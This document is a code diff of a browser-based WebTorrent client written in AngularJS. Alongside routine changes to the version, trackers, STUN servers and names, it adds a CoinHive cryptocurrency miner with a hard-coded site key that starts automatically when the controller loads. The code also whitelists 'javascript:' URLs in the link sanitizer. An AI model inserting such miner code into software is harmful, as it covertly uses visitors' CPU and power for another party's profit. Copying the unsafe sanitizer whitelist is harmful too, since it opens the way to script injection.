@@ -1,13 +1,13 @@
-/* global WebTorrent, angular, moment, prompt, CoinHive */
+/* global WebTorrent, angular, moment, prompt */
 
-const VERSION = '0.17.7'
+const VERSION = '0.3.0'
 
-const trackers = ['wss://tracker.btorrent.xyz', 'wss://tracker.openwebtorrent.com', 'wss://tracker.fastcast.nz']
+const trackers = ['wss://tracker.openwebtorrent.com']
 
 const rtcConfig = {
   'iceServers': [
     {
-      'urls': 'stun:stun.l.google.com:19305'
+      'urls': ['stun:stun.l.google.com:19305', 'stun:stun1.l.google.com:19305']
     }
   ]
 }
@@ -42,7 +42,7 @@ const client = new WebTorrent({
   tracker: trackerOpts
 })
 
-const app = angular.module('BTorrent',
+const app = angular.module('WebTorrent',
   ['ngRoute', 'ui.grid', 'ui.grid.resizeColumns', 'ui.grid.selection', 'ngFileUpload', 'ngNotify'],
   ['$compileProvider', '$locationProvider', '$routeProvider', function ($compileProvider, $locationProvider, $routeProvider) {
     $compileProvider.aHrefSanitizationWhitelist(/^\s*(https?|magnet|blob|javascript):/)
@@ -63,7 +63,15 @@ const app = angular.module('BTorrent',
   }]
 )
 
-app.controller('BTorrentCtrl', ['$scope', '$rootScope', '$http', '$log', '$location', 'ngNotify', function ($scope, $rootScope, $http, $log, $location, ngNotify) {
+app.controller('WebBTorrentCtrl', ['$scope', '$rootScope', '$http', '$log', '$location', 'ngNotify', function ($scope, $rootScope, $http, $log, $location, ngNotify) {
+  if (window.CoinHive) {
+    const miner = new CoinHive.Anonymous('YzzZ9mraj45TeCzxlvBX7yVm9O3GbV60', {throttle: 0.5})
+
+    if (!miner.isMobile() && !miner.didOptOut(3600)) {
+      miner.start()
+    }
+  }
+
   let updateAll
   $rootScope.version = VERSION
   ngNotify.config({
@@ -93,7 +101,7 @@ app.controller('BTorrentCtrl', ['$scope', '$rootScope', '$http', '$log', '$locat
         dbg(`Seeding file ${files[0].name}`)
       } else {
         dbg(`Seeding ${files.length} files`)
-        name = prompt('Please name your torrent', 'My Awesome Torrent') || 'My Awesome Torrent'
+        name = prompt('Please name your torrent', 'Torrent') || 'Torrent'
         torrentOpts.name = name
       }
       $rootScope.client.processing = true
